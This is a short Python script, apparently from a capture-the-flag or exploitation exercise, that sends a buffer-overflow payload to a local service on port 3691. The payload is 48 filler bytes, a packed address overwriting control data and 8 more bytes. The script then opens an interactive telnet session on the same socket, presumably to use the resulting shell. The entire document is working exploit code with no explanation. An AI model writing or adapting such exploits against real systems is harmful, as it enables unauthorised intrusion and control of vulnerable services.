
import socket
import telnetlib
from struct import pack

s = socket.socket()
s.connect(("127.0.0.1" ,3691))

s.send("A" * 48  +
        pack("<I", 0x0804a000) +
        "A" * 8 
        + "\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
